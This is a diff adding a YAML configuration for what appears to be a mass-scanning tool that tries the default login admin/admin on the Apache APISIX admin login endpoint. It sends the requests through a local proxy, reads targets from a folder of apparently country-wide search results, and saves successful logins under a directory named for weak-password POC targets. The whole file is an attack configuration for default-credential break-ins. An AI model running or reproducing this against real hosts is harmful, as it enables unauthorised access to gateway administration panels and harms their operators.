@@ -1,0 +1,18 @@
+targetPath: /apisix/admin/user/login
+targetMethod: post
+targetTimeout: 1
+targetProfixs:
+    http: 127.0.0.1:7890
+    https: 127.0.0.1:7890
+targetAllowRedirects: false
+targetHeaders:
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0
+    Content-Type: application/json;charset=UTF-8
+targetJson: {"username":"admin","password":"admin"}
+targetData:
+targetReExpression:
+    respStatusCode: 200
+    respBody: \"code\"\s*:\s*0
+targetDir: ../countryQueryResult/
+targetOutputDir: ../2CVE漏洞POC目标/APISIX弱密码登陆/
+targetRestText: True
